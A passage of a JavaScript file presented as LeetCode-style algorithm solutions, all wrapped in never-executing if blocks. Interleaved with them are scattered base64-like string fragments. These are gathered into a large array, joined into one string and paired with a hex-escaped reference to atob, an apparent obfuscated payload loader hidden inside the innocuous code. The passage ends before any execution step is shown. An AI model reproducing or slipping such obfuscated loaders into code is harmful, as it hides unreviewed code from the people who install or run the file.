            this.map.delete(this.tail.key);
            this.tail = this.tail.prev;
            this.tail.next = null;
            this.curSize--;
        }
        
        this.map.set(key, newNode);
    }
};

}

    var ueojjurhh = 'ylmLMe';
// script
    var hkyzaq = 'lLHbf';
    var dgyjxv = 'Iwd';
    var stgrnd = 'GjKpD';
if (null === 4) {
    /**
Given a string containing just the characters '(', ')', '{', '}', '[' and ']', determine if the input string is valid.

The brackets must close in the correct order, "()" and "()[]{}" are all valid but "(]" and "([)]" are not.

 * @param {string} s
 * @return {boolean}
 */
var isValid = function(s) {
    if (s === null) {
        return false;
    }
    var stack = [],
        sets = {'(':')', '{':'}', '[':']'},
        len = s.length,
        cur,
        stackTop,
        i;

    for (i = 0; i < len; i++) {
        cur = s.charAt(i);
        if (sets.hasOwnProperty(cur)) {
            stack.push(cur);
        } else {
            if (stack.length === 0) {
                return false;
            } else {
                stackTop = stack.pop();
                if (sets[stackTop] !== cur) {
                    return false;
                }
            }
        }
    }
    if (stack.length === 0) {
        return true;
    } else {
        return false;
    }
    
};

}

    var jmwgxt = 'kp5azdD';
    var vbbwkanibfol = 'ybvIaok';
    var okcbmfdqd = 'aUFn';
    var zdvjjrzyd = 'mOKWEAmc';
    var rfcetgmyhamqs = 'SUNBZ0lDQ';
if (88 > 137) {
    /**
Given a sorted array and a target value, return the index if the target is found. If not, return the index where it would be if it were inserted in order.

You may assume no duplicates in the array.

Here are few examples.
[1,3,5,6], 5 → 2
[1,3,5,6], 2 → 1
[1,3,5,6], 7 → 4
[1,3,5,6], 0 → 0
*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number}
 */
var searchInsert = function(nums, target) {
    var len = nums.length,
        i;
    
    for (i = 0; i < len; i++) {
        if (target <= nums[i]) {
            return i;
        }
    }
    
    return len;
};

}

    var jbccjki = 'bGQckDCAo';
if (0.33 && false) {
    /**
There is a new alien language which uses the latin alphabet. However, the order among letters are unknown to you. You receive a list of words from the dictionary, where words are sorted lexicographically by the rules of this new language. Derive the order of letters in this language.

For example,
Given the following words in dictionary,

[
  "wrt",
  "wrf",
  "er",
  "ett",
  "rftt"
]
The correct order is: "wertf".

Note:
You may assume all letters are in lowercase.
If the order is invalid, return an empty string.
There may be multiple valid order of letters, return any one of them is fine.
*/
/**
 * @param {string[]} words
 * @return {string}
 */
var alienOrder = function(words) {
    if (words.length === 0) {
        return '';
    }
    
    const len = words.length;
    let map = {}; // value is the prerequisite of key
    let charPreReqCount = {};
    let i;
    let queue = [];
    let result = [];
    let hasCycle = false;
    
    for (i = 0; i < len; i++) {
        const chars = words[i].split('');
        
        let j = 0;
        
        for (j = 0; j < chars.length; j++) {
            if (!map[chars[j]]) {
                map[chars[j]] = [];
                charPreReqCount[chars[j]] = 0;
            }
        }

        if (i === 0 || words[i] === words[i - 1]) {
            continue;
        }
        
        const cur = words[i];
        const prev = words[i - 1];
        j = 0;
        
        while(j < cur.length && j < prev.length && cur.charAt(j) === prev.charAt(j)) {
            j++;
        }
        
        if (j < prev.length && map[prev.charAt(j)].indexOf(cur.charAt(j)) === -1) {
            map[prev.charAt(j)].push(cur.charAt(j));
            
            charPreReqCount[cur.charAt(j)]++;
        }
    }
    
    Object.keys(charPreReqCount).forEach(char => {
        if (charPreReqCount[char] === 0) {
            queue.push(char);
        }
    });
    
    while(queue.length > 0) {
        const char = queue.shift();
        
        result.push(char);
        
        for (i = 0; i < map[char].length; i++) {
            charPreReqCount[map[char][i]]--;
            
            if (charPreReqCount[map[char][i]] === 0) {
                queue.push(map[char][i]);
            }
        }
    }
    
    // detect cycle
    Object.keys(charPreReqCount).forEach(function(char) {
        if (charPreReqCount[char] !== 0) {
            hasCycle = true;
        }
    });
    
    return hasCycle ? '' : result.join('');
};

}

    var yfoxllnwjmvk = 'Wdm';
    var utitnpbq = 'Eibao';
    var iguzeycgpwppp = 'UW9nSUNB';
if (76 > 163) {
    /**
Given an array nums containing n + 1 integers where each integer is between 1 and n (inclusive), prove that at least one duplicate number must exist. Assume that there is only one duplicate number, find the duplicate one.

Note:
You must not modify the array (assume the array is read only).
You must use only constant, O(1) extra space.
Your runtime complexity should be less than O(n2).
There is only one duplicate number in the array, but it could be repeated more than once.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var findDuplicate = function(nums) {
    var fast = 0,
        slow = 0,
        find = 0;
        
    while (true) {
        fast = nums[nums[fast]];
        slow = nums[slow];
        
        if (fast === slow) {
            break;
        }
    }
    
    while (find !== slow) {
        find = nums[find];
        slow = nums[slow];
    }
    
    return find;
};


// SOLUTION 2
/**
二分法
复杂度
时间 O(NlogN) 空间 O(1)

思路
实际上，我们可以根据抽屉原理简化刚才的暴力法。我们不一定要依次选择数，然后看是否有这个数的重复数，我们可以用二分法先选取n/2，按照抽屉原理，整个数组中如果小于等于n/2的数的数量大于n/2，说明1到n/2这个区间是肯定有重复数字的。比如6个抽屉，如果有7个袜子要放到抽屉里，那肯定有一个抽屉至少两个袜子。这里抽屉就是1到n/2的每一个数，而袜子就是整个数组中小于等于n/2的那些数。这样我们就能知道下次选择的数的范围，如果1到n/2区间内肯定有重复数字，则下次在1到n/2范围内找，否则在n/2到n范围内找。下次找的时候，还是找一半。

注意
我们比较的mid而不是nums[mid]
因为mid是下标，所以判断式应为cnt > mid，最后返回min

代码
public class Solution {
    public int findDuplicate(int[] nums) {
        int min = 0, max = nums.length - 1;
        while(min <= max){
            // 找到中间那个数
            int mid = min + (max - min) / 2;
            int cnt = 0;
            // 计算总数组中有多少个数小于等于中间数
            for(int i = 0; i < nums.length; i++){
                if(nums[i] <= mid){
                    cnt++;
                }
            }
            // 如果小于等于中间数的数量大于中间数，说明前半部分必有重复
            if(cnt > mid){
                max = mid - 1;
            // 否则后半部分必有重复
            } else {
                min = mid + 1;
            }
        }
        return min;
    }
}

*/

}

    var atcxxwlksud = 'LWrUi';
if ('y' === 'N') {
    /**
 * @param {number} rowIndex
 * @return {number[]}
 */
var getRow = function(rowIndex) {
    var result = [],
        parent = [],
        curRow,
        i;
    
    if (rowIndex < 0) {
        return result;
    }
    
    curRow = 0;
    parent.push(1);
    result.push(1);
    
    while (curRow < rowIndex) {
        curRow++;
        result = [];
        result.push(1);
        for (i = 1; i < curRow; i++) {
            result[i] = parent[i] + parent[i - 1];
        }
        
        result.push(1);
        parent = result.concat();
    }
    
    return result;
};

// in place solution
/**
 * @param {number} rowIndex
 * @return {number[]}
 */
var getRow = function(rowIndex) {
    var result = [],
        curRow,
        i;
    
    if (rowIndex < 0) {
        return result;
    }
    
    curRow = 0;
    result.push(1);
    
    while (curRow < rowIndex) {
        curRow++;
        
        for (i = curRow - 1; i > 0; i--) {
            result[i] = result[i] + result[i - 1];
        }
        
        result.push(1);
    }
    
    return result;
};

}

    var saqldrppkzvxlgk = 'Z2ZTd2';
    var qpcxaissrtc = 'qMUWDYv';
    var ybjeftmxqo = 'dNVEF';
if ('z' === 'F') {
    /**
 * @param {number} n
 * @return {boolean}
 */
var isPowerOfThree = function(n) {
    if (n == 1) {
        return true
    }
    if (n === 0 || n % 3 > 0) {
        return false
    }
    return isPowerOfThree(n / 3)
};

}

    var cgsdkfyl = 'ICDtsV';
    var gfgwrzun = '3S1RzS';
if (!true && 1) {
    /**
Given n non-negative integers a1, a2, ..., an, where each represents a point at coordinate (i, ai). n vertical lines are drawn such that the two endpoints of line i is at (i, ai) and (i, 0). Find two lines, which together with x-axis forms a container, such that the container contains the most water.

Note: You may not slant the container.

 * @param {number[]} height
 * @return {number}
 */
var maxArea = function(height) {
    var len = height.length, 
        left = 0,
        right = len - 1,
        max = 0;
    
    while (left < right) {
        max = Math.max(max, (right - left)*Math.min(height[left], height[right]));
        
        if (height[left] < height[right]) {
            left ++;
        } else {
            right --;
        }
    }
    return max;
};

}

    var aimeno = 'NwQto';
if ('false' === true) {
    /**
 * @param {number} numCourses
 * @param {number[][]} prerequisites
 * @return {boolean}
 */

var constructGraph = function(numNodes, pre) {
    var nodes = [];
    for (var i = 0; i < numNodes; i++) {
        var node = {};
        node.neighbors = [];
        nodes[i] = node;
    }
    for (var j = 0; j < pre.length; j++) {
        var s = pre[j][1];
        var d = pre[j][0];
        nodes[s].neighbors.push(nodes[d]);
    }
    return nodes;
}

// Return true if there is a cycle detected.
var dfs = function(startNode, parents) {
    if (parents.indexOf(startNode) >= 0) return true;
    if (startNode.visited) return false;
    
    startNode.visited = true;
    var neighbors = startNode.neighbors;
    parents.push(startNode);
    for (var i = 0; i < neighbors.length; i++) {
        var hasCycle = dfs(neighbors[i], parents);
        if (hasCycle) return true;
    }
    parents.pop();
}

var canFinish = function(numCourses, prerequisites) {
    var nodes = constructGraph(numCourses, prerequisites);
    for (var i = 0; i < nodes.length; i++) {
        var hasCycle = dfs(nodes[i], []);
        if (hasCycle) return false;
    }
    return true;
};



// SOLUTION 2
/**
There are a total of n courses you have to take, labeled from 0 to n - 1.

Some courses may have prerequisites, for example to take course 0 you have to first take course 1, which is expressed as a pair: [0,1]

Given the total number of courses and a list of prerequisite pairs, is it possible for you to finish all courses?

For example:

2, [[1,0]]
There are a total of 2 courses to take. To take course 1 you should have finished course 0. So it is possible.

2, [[1,0],[0,1]]
There are a total of 2 courses to take. To take course 1 you should have finished course 0, and to take course 0 you should also have finished course 1. So it is impossible.

Note:
The input prerequisites is a graph represented by a list of edges, not adjacency matrices. Read more about how a graph is represented.

click to show more hints.

Hints:
This problem is equivalent to finding if a cycle exists in a directed graph. If a cycle exists, no topological ordering exists and therefore it will be impossible to take all courses.
Topological Sort via DFS - A great video tutorial (21 minutes) on Coursera explaining the basic concepts of Topological Sort.
Topological sort could also be done via BFS.
*/
/**
 * @param {number} numCourses
 * @param {number[][]} prerequisites
 * @return {boolean}
 */
var canFinish = function(numCourses, prerequisites) {
    var courses = [],
        prereqCounts = [],
        temp,
        setIter,
        i,
        j,
        k;
        
    for (i = 0; i < numCourses; i++) {
        courses.push(new Set());
    }
    
    // [1] is [0]'s prerequisite 
    for (i = 0; i < prerequisites.length; i++) {
        courses[prerequisites[i][1]].add(prerequisites[i][0]);
    }
    
    for (i = 0; i < numCourses; i++) {
        prereqCounts[i] = 0;
    }
    
    // count the pre-courses
    for (i = 0; i < numCourses; i++) {
        temp = Array.from(courses[i]);
        // setIter = temp[Symbol.iterator]();
        
        // while(setIter.hasNext()) {
        //     prereqCounts[setIter.next()]++;
        // }
        for (j = 0; j < temp.length; j++) {
            prereqCounts[temp[j]]++;
        }
    }
    
    // remove a non-pre course each time
    for (i = 0; i < numCourses; i++) {
        for (j = 0; j < numCourses; j++) {
            if (prereqCounts[j] === 0) {
                break;
            }
        }
        
        // if didn't find a non-pre course
        if (j === numCourses) {
            return false;
        }
        prereqCounts[j] = -1;
        // decrease courses that post the course
        temp = Array.from(courses[j]);
        // setIter = temp[Symbol.iterator]();
        
        // while(setIter.hasNext()) {
        //     prereqCounts[setIter.next()]--;
        // }
        
        for (k = 0; k < temp.length; k++) {
            prereqCounts[temp[k]]--;
        }
    }
    
    return true;
};
}

    var nygwzcy = '2ZTa29L';
if (8 instanceof String) {
    /**
Given a singly linked list where elements are sorted in ascending order, convert it to a height balanced BST.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {TreeNode}
 */
var sortedListToBST = function(head) {
    var len = 0,
        node = head;
    
    if (!node) {
        return null;
    }
    
    while (node) {
        len++;
        node = node.next;
    }
    curNode = head;
    return helper(0, len - 1);
},
curNode;

// build tree bottom up
function helper(start, end) {
    if (start > end) {
        return null;
    }
    
    var mid = parseInt((start + end) / 2),
        left,
        right,
        node;
        
    left = helper(start, mid - 1),
    node = new TreeNode(curNode.val);
    curNode = curNode.next;
    right = helper(mid + 1, end);
    
    node.left = left;
    node.right = right;
    
    return node;
}


// solution 2
var sortedListToBST = function(head) {
    var arr = [],
        node = head,
        len;
    
    if (!node) {
        return null;
    }
    
    while (node) {
        arr.push(node);
        node = node.next;
    }
    
    len = arr.length;
    
    if (len === 1) {
        return head;
    }
    
    return getMidNode(0, len - 1, arr);
};

function getMidNode(start, end, arr) {
    if (start > end) {
        return null;
    }
    
    var mid = parseInt((start + end) / 2),
        node = new TreeNode(arr[mid].val);
        
    node.left = getMidNode(start, mid - 1, arr);
    node.right = getMidNode(mid + 1, end, arr);
    
    return node;
}

}

    var njzehnvvmxme = 'nQALgEGAS';
if ('true' === true) {
    /**
 * @param {number} n
 * @return {boolean}
 */
var canWinNim = function(n) {
    return n % 4 > 0
};

}

    var ooxnbgnotedxplf = 'VHNLIikp';
if ('s' === 'N') {
    /**
Given two 1d vectors, implement an iterator to return their elements alternately.

For example, given two 1d vectors:

v1 = [1, 2]
v2 = [3, 4, 5, 6]

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1, 3, 2, 4, 5, 6].

Follow up: What if you are given k 1d vectors? How well can your code be extended to such cases?

Clarification for the follow up question - Update (2015-09-18):
The "Zigzag" order is not clearly defined and is ambiguous for k > 2 cases. If "Zigzag" does not look right to you, replace "Zigzag" with "Cyclic". For example, given the following input:

[1,2,3]
[4,5,6,7]
[8,9]

It should return [1,4,8,2,5,9,3,6,7]. 
*/
/**
 * @constructor
 * @param {Integer[]} v1
 * @param {Integer[]} v1
 */
var ZigzagIterator = function ZigzagIterator(v1, v2) {
    this.arr = arguments;
    this.list = [];
    
    for (let i = 0; i < this.arr.length; i++) {
        if (this.arr[i].length > 0) {
            this.list.push([i, 0]);
        }
    }
    
};


/**
 * @this ZigzagIterator
 * @returns {boolean}
 */
ZigzagIterator.prototype.hasNext = function hasNext() {
    return this.list.length > 0;
};

/**
 * @this ZigzagIterator
 * @returns {integer}
 */
ZigzagIterator.prototype.next = function next() {
    const targetIndex = this.list.shift();
    const val = this.arr[targetIndex[0]][targetIndex[1]];
    
    if (targetIndex[1] < this.arr[targetIndex[0]].length - 1) {
        this.list.push([targetIndex[0], targetIndex[1] + 1]);
    }
    
    return val;
};

/**
 * Your ZigzagIterator will be called like this:
 * var i = new ZigzagIterator(v1, v2), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var dwlohodo = 'QKkFJspmN';
    var xdyez = 'Owo=';
    var fqcipud = 'fVcIZLq';
if (7 instanceof String) {
    /**
Given an array with n objects colored red, white or blue, sort them so that objects of the same color are adjacent, with the colors in the order red, white and blue.

Here, we will use the integers 0, 1, and 2 to represent the color red, white, and blue respectively.

Note:
You are not suppose to use the library's sort function for this problem.

click to show follow up.

Follow up:
A rather straight forward solution is a two-pass algorithm using counting sort.
First, iterate the array counting number of 0's, 1's, and 2's, then overwrite array with total number of 0's, then 1's and followed by 2's.

Could you come up with an one-pass algorithm using only constant space?

 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var sortColors = function(nums) {
    var len = nums.length,
        redEnds = 0,
        blueStarts = len - 1,
        i;
    
    function swap(m, n, arr) {
        var temp = arr[m];
        
        arr[m] = arr[n];
        arr[n] = temp;
    }

    for (i = 0; i <= blueStarts;) {
        if (nums[i] === 0) {
            swap(i, redEnds, nums);
            i++;
            redEnds++;
        } else if (nums[i] === 2) {
            swap(i, blueStarts, nums);
            blueStarts--;
        } else {
            i++;
        }
    }
};

}

    var gshklp = [wegzqcldtzvr, qozalusrs, ollzppzjhgjl, ztqamxrqjh, seymxqzao, qgtoin, tvvrcwey, epzjcprzquhk, wukcn, tbkpayg, xmnvoi, mvtkiwzpfkucpwd, upmvlza, natfdjtnehckdm, zwzowqhty, ksiahrmkb, cmdxpsnerbacl, uwbwuivn, ocihnu, zjydqteklifd, oirsfzcyjkfw, zxtxlo, pqxripbzs, xabjqnd, lrpplyi, djiosg, ccxnawlj, cxtzw, msmejxnmacrjrzo, ehstmodhqdgiano, sxokcsaejw, kxhbqrczlgbmfjy, jjuwri, ycjbqa, xtwakccxmrv, sqkncz, tmtdj, nkkpwcvzeb, irhskzogfmzpjw, zyibahxzeru, uzpxbztdezni, nchpwybsiag, oevuzg, pinltreswkitc, nnzimrtwxvh, tascpmdgtas, qjpcbiqm, lxzenhs, wjzdxtbhhooh, zmkgmdqt, lksavemav, rgmaafokx, wnaqpckss, twurkbfxwao, gootn, prqsatmmfbtq, wgcjg, iouqbix, pmnvkpdbdild, lgoap, rvoki, kybbvkcjatq, rikqfc, zjurhtasqooltcp, dxesfnlctgavxyo, nwesfmdzuwyfy, dpczheuru, ldmcd, bhcgwb, wxyzq, ckhlair, lwoefkfnbuyckhb, jphpzh, tpbcrxggjx, ltsbnavfjcsydv, kiywbpmsbtp, vtukjibur, kshtptb, rqhdty, snhanew, qvyazyepyt, ackxlz, bnegbhssc, vlwgzjidwipwabf, xqkjcwibfchd, mygmqtbldnvrw, dtvxcn, hszzeec, mpvfythfczvyiyh, pvowpm, feqnblxnt, pusvgseyynhbk, fgdijikedquiwal, jgcvzcwmoiby, vfsapwtcnkpznzq, yidaoysyh, nhvciv, voodx, tesqjtbyh, yricgxmdqkuf, qbhlqcheqaae, fdnyfxaqvacpv, cugpqmrvcfk, bmfemu, wnalwhd, awiniu, kxjxucnefei, kilijwgx, isscswlbetcdr, fovyryb, egjmotvd, ztkjhuczvcdz, klfoyz, ftjmarwvworeg, mkwbhbnjkldktg, ihnxg, tfzbnssvirdvna, akvapexdjo, kplbtyprhxw, mgzmdazgz, wbhdbsbvoryxh, qjfud, uqstcladw, soksdzbnjofjyw, ybijocuriik, jaktalhbddtjqa, xrggvai, xjhmlnyztc, vpfaqc, hccjcuzcswlkmt, ksfdi, uifrhhekisfd, omdcrg, hkwnena, letzxxcvcmisppo, peyquhjzqmdidpn, qwkbwqzazqpixn, bfufoothp, xcmdrqxiwnvie, kpofdrzuxnwyxzz, tbhmxgkmkbcgw, gnuql, mlcqmasnrei, hjzxjbmaq, qghbw, kyhtch, attyphf, blbgpouzm, avyxhkgeb, epohchvnwb, wkzfpggwswnupkk, zoxliika, imucixoxlppc, kukqynrcu, wtjik, rzultyhhdbqh, kldswrinrfhmtv, yletuxrpixo, crjaxhmcdpzyjgs, gmmzt, xuauqjtvq, borpyjmz, yixwiapr, fmgvtjstwzsuhw, emowyoyhifmmdhv, vgedfr, gxngbprtzyy, wnlkbaye, ooedjvoajt, jkfso, rrvykkx, loedsvhcmwj, crnseq, hszhimr, wkdshaotzj, qmfgsadwykqdl, hhzesxbbh, hjlhjtqjvx, xxqjmpmtiywyflv, iabgidm, kmtdq, twebjth, ubybbba, zzmhcrlsfymc, wlvmlworqkueyso, tfsxxqvbcwxeg, jgbzhq, dhosdwtulbam, xgwupccadxmrvjk, wwxktgnhhkglb, fclsdgf, moymj, xojizxv, mfwloqzkwcn, ivoyr, jogyu, ygofwst, yhsdgaos, cqgyxdh, hhcjusnwvfadvhz, qrcbsytgst, xphhpuyelj, tcysevvypcyat, inyqi, rrqbzvbzuclmq, lutndzj, mtzgbzrkg, mqpehrczqf, dmvqwujyoexlncn, hbaivasvnhy, poitgo, gzktwnraffotezj, uowyoyxibgj, qjqifynroxxd, mibfbfjmeizymy, nwdurrwtwxs, iuwefksshix, cxjrecc, jgfggnxsf, udneomgqpiudacw, rkqbldykz, zatvqslatmqhqi, sjlrijiw, gnvyhcqoxazxpjo, etfqqpv, lcdzbm, onbbtmtrb, wekzryhevuh, oshzwfwe, czkdxrkcqic, cmjxgqp, vnlgkumcgsbizz, bmcdabyhxhsgu, qxmedspnknbvvv, mcsnf, luvkkatzxl, hxrlqnxcfhncn, nuxsqaroic, akgemiwubaynkll, ufrfpsswq, tmfcezmavfgmgp, hotqj, ghqwvhqteqpmcxx, mqzctigdv, fvcaqptytqd, cdtzoktzg, koaazx, vksiyhpq, lfkaui, zloealrbqnez, tzjmuzuxxd, vdcbzsssxezio, retwnfwiy, qnttftjh, dfrdhwncrcml, mgocoal, zxvan, upeaicrohgk, xpvck, jxvvkwkgtxrpzvl, fibdbtdalwcvz, vpbgmpapzraeg, mbiui, ugmbymdc, lczyilcp, qelsqwqtsxzbxis, gbwcw, wdmfd, wajxwnptj, mfuiw, swfik, gxfnpri, qudtqx, nltmutt, uuyto, tntlk, joltamnlqhgz, zodkgptafzoh, hctgqhsoqg, bszqufrnvqsatmu, kcraqawxbseswkj, rkyarz, dykbeqq, vbyxthnn, ysvusybkgyuqguk, plfhvttj, lzkanxvdgk, wwcxv, sflgmevga, wxhksbj, mnfohqumemcgz, gytattbbnczg, llrkknlzi, otyetzxa, cxsvdeqv, yfwvs, hpxnslqjvfj, eudogegf, owjpglo, mkvguj, hqbydtya, blddivhnnqctqbq, kiiynhzo, pejbfqouqdxt, bevhsqjbszhj, gktcilm, hmdwtxecbxony, wttmonfkpkq, kfwfaqyjk, lbhdlrgxmti, nirpksn, phhsztsqdveaywk, znxwp, geaabp, ngwmzkewazuxlp, sgmawapximctyrl, oubvjykh, gnbruv, ywquv, baryjw, mosygaewmugz, kqanvtgivtrm, ctfmfcyyqthoooi, jjlcrejmzz, osztupxcz, ccwajtnjcfw, dcsovff, dzddpfsd, rfwdguupc, necgqfj, jjfzakcib, yusjk, uqncioafzygqo, lpltctqzslqhcqg, gwmpisdeyn, eelcimwcp, lpgpifabhpsnjx, caepa, ztymjep, sbgahay, uafmznvd, fuvnlijuohwqsd, waqardcpz, nytyimcnd, avdsrzipk, sskjx, owvezwqf, wcjbp, pqnppfmxvmald, bccdsrexmj, qffxmyfyhs, ajuuqu, pwzby, psojeuvbbrjjo, fpmeayedobftsc, cbcltcandeiuyp, vbyxwpvgonntf, bcwiaypk, cvpxgnsaqwkaws, wnelretuxq, kgrhfvluxxvj, qqaapbq, pcbxoeyxwbi, axfsrakgof, zyulghz, ggeuipzji, vapbcyvin, qnddsmfcnpy, aeimaifdhejytmk, npyrdvgcja, iihxhkrbyimasyk, qlltlxasd, bwlbkerwauzvj, qhdbamnrvsbuicf, wzrnzwnapysgvqb, tflxbodokrvm, ydusyvpe, waxtxghmbyujbeh, pdqkeeddgplri, mmkdegppabyye, lzptpfmulhfjy, oefeuys, rqvqsgwcefabz, cmzxkqrlhb, httqkjr, ttuersrcwqqlj, dmjtuhxwszyjvc, vhjwwmnolwco, chyvgiqxh, mwqkpygdcmnkq, bnvbutnb, dxukmcybrkjpw, iydnsyue, qhxbfpshpcq, qhwwulcmi, jccxywkucwhxjj, ofwctcqlsalwetg, lwfcazybzwkqsxr, luhftmhfpv, uxvjhlqaridfqc, vrgphcecshhvz, gxpjjznjwjxbv, kkxqueyvxrks, ekubfby, nypngqdsfgjy, nfvptfgk, cmqshmsjixoefjk, jwxyzuvhab, qgfoarar, qnzdcgny, luwofbkchi, djhckhwudixa, owwpd, rwpnlliiluq, mihlurmcadkk, jvxjj, vxdutsqymzchrwd, cpdjbduislolwv, iqxziqysb, keech, ldppyqbksfil, vlgpcraxl, zyceubcwwdjuq, sirri, elltsrrcft, irfozfedp, igbmco, oovrovirqe, mncyzcgjtzkozec, jyncnwxynh, bchjwvyy, aruxszeeyc, vucnnbk, wikrbwidd, yoidnfhiyiofg, nxvcvhyicycectp, ljxtnjf, luxkyrkmazifrdx, qfksyvnqnnu, nhranxsmia, nqycufooh, wigkqxwvmkvm, ttqnyycaw, tmxbolhhdl, lyarvqvxjejsso, walzlpxeg, vephz, ootodrstdrpw, krrfdqifgnt, ywkqi, dsbggcy, kmrmfvsyhb, mfwuttdgqzml, xutdrksnyg, sdczkn, axuqcezdj, udpwwyoqnih, csgwjkmw, nivucakk, guxovboik, aucyaqfeudqdvkj, rcpmz, jbulunqqhgkmm, wkrsczaonfgzrbk, mrsnhdpaln, ztzffevdcwrs, wbdwlu, odahh, zpfgcgmblhg, upgctnjlmvz, bftnahckr, ntfjgckqtzcwm, otjgf, dujjfp, dshundgcpz, xczlzmkbpqkgc, ugwvrobpckudge, xqwvnhmnie, nbedi, qhlrbyorit, ymkwujsazvf, zwnhtio, lxrlm, ggaxeymwwbyq, yzmpzyimqejomou, tnaafvuaytduwe, kygbqek, phfyzeauyktq, nxwfkemy, zkorogxdyln, umuqe, rzgwcahbzygrfve, thdofsyw, laicwacb, xdslfndgfd, jscqmfgidzfmt, iehzftegmtxnee, virlvsbzn, xlcohmlwq, beyonkbbyhar, urgmbgqdxhc, tbbxuchxfbkgck, gpuomuyf, viitldrnvvo, gvtuifaaabaatsy, cejfzunkrnv, iabtcryp, mfqrivetu, sumllanrxgmoe, fwovnonbezkt, gefwkjnbeetbxjb, pfxbbpewana, kmgnerowkznum, bresblty, adaawg, dgyjxv, jmwgxt, okcbmfdqd, rfcetgmyhamqs, yfoxllnwjmvk, iguzeycgpwppp, saqldrppkzvxlgk, ybjeftmxqo, gfgwrzun, nygwzcy, ooxnbgnotedxplf, xdyez];
if (1 === 15) {
    /**
Given a range [m, n] where 0 <= m <= n <= 2147483647, return the bitwise AND of all numbers in this range, inclusive.

For example, given the range [5, 7], you should return 4.
*/

/**
 * @param {number} m
 * @param {number} n
 * @return {number}
 */
var rangeBitwiseAnd = function(m, n) {
    var offset = 0;
    
    while (m && n) {
        if (m === n) {
            return m << offset;
        }
        
        m >>= 1;
        n >>= 1;
        offset++;
    }
    
    return 0;
};

}

    var wwvaawoljn = 'srRMYzIpQ';
if (Array.isArray(8)) {
    /**
Given two words (beginWord and endWord), and a dictionary's word list, find the length of shortest transformation sequence from beginWord to endWord, such that:

Only one letter can be changed at a time
Each intermediate word must exist in the word list
For example,

Given:
beginWord = "hit"
endWord = "cog"
wordList = ["hot","dot","dog","lot","log"]
As one shortest transformation is "hit" -> "hot" -> "dot" -> "dog" -> "cog",
return its length 5.

Note:
Return 0 if there is no such transformation sequence.
All words have the same length.
All words contain only lowercase alphabetic characters.
*/
/**
 * @param {string} beginWord
 * @param {string} endWord
 * @param {Set} wordList
 *   Note: wordList is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {number}
 */
var ladderLength = function(beginWord, endWord, wordList) {
    var visit = {},
        len = beginWord.length,
        queue = [],
        charArr = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'],
        curNode,
        curStr,
        tempStr,
        tempNode,
        i,
        j;
    
    curNode = new node(beginWord, 1);
    visit[curNode.str] = true;
    queue.push(curNode);
    

    while (queue.length > 0) {
        curNode = queue.shift();
        curStr = curNode.str;
        for (i = 0; i < len; i++) {
            for (j = 0; j < 26; j++) {
                if (charArr[j] === curStr.charAt(i)) {
                    continue;
                }
                
                tempStr = curStr.substring(0, i) + charArr[j] + curStr.substring(i + 1, len);
                
                if (tempStr === endWord) {
                    return curNode.step + 1;
                }
                
                if (wordList.has(tempStr) && !visit.hasOwnProperty(tempStr)) {
                    visit[tempStr] = true;
                    tempNode = new node(tempStr, curNode.step + 1);
                    queue.push(tempNode);
                }
            }
        }
    }
        
    return 0;
};

function node(str, step) {
    this.str = str;
    this.step = step;
}

}

// debug world import value export event jsawz string compile script value function
    var axkbpjq = 'DGdEwm';

    var fznmwrex = 'UeUdKfsH';
    var phnixc = gshklp.join("");
if (0.75 && false) {
    /**
Given a string containing only digits, restore it by returning all possible valid IP address combinations.

For example:
Given "25525511135",

return ["255.255.11.135", "255.255.111.35"]. (Order does not matter)
*/
/**
 * @param {string} s
 * @return {string[]}
 */
var restoreIpAddresses = function(s) {
    var result = [],
        len = s.length;
    
    if (len > 12) {
        return result;
    }
    
    helper(result, s, 0, [], len);
    
    return result;
};

function helper(result, s, index, curArr, len) {
    if (curArr.length === 4) {
        if (index === len) {
            result.push(curArr.join('.'));
        }
        return;
    }
    
    var i,
        num;
    
    // only 3 situations
    for (i = index; i < len && i <= index + 3; i++) {
        num = s.substring(index, i + 1);
        
        if (isValid(num)) {
            curArr.push(parseInt(num));
            helper(result, s, i + 1, curArr.concat(), len);
            curArr.pop();
        } 
        
    }
}

function isValid(s) {
    if (s.charAt(0) === '0') {
        return s === '0';
    }
    
    var num = parseInt(s);
    
    return num >= 0 && num <= 255;
}

}

    var goiruqvn = 'QFHBRXtfz';
if (31 > 145) {
    /**
Given a string containing only digits, restore it by returning all possible valid IP address combinations.

For example:
Given "25525511135",

return ["255.255.11.135", "255.255.111.35"]. (Order does not matter)
*/
/**
 * @param {string} s
 * @return {string[]}
 */
var restoreIpAddresses = function(s) {
    var result = [],
        len = s.length;
    
    if (len > 12) {
        return result;
    }
    
    helper(result, s, 0, [], len);
    
    return result;
};

function helper(result, s, index, curArr, len) {
    if (curArr.length === 4) {
        if (index === len) {
            result.push(curArr.join('.'));
        }
        return;
    }
    
    var i,
        num;
    
    // only 3 situations
    for (i = index; i < len && i <= index + 3; i++) {
        num = s.substring(index, i + 1);
        
        if (isValid(num)) {
            curArr.push(parseInt(num));
            helper(result, s, i + 1, curArr.concat(), len);
            curArr.pop();
        } 
        
    }
}

function isValid(s) {
    if (s.charAt(0) === '0') {
        return s === '0';
    }
    
    var num = parseInt(s);
    
    return num >= 0 && num <= 255;
}

}

    var tuvrjq = this["\x61\x74\x6f\x62"];
if (!true && 1) {
    /**
Given two strings s and t, determine if they are isomorphic.

Two strings are isomorphic if the characters in s can be replaced to get t.

All occurrences of a character must be replaced with another character while preserving the order of characters. No two characters may map to the same character but a character may map to itself.

For example,
Given "egg", "add", return true.

Given "foo", "bar", return false.

Given "paper", "title", return true.

Note:
You may assume both s and t have the same length.
*/

/**
 * @param {string} s
 * @param {string} t
 * @return {boolean}
 */
var isIsomorphic = function(s, t) {
    var len = s.length,
        mapS = {},
        mapT = {},
        curS,
        curT,
        i;
        
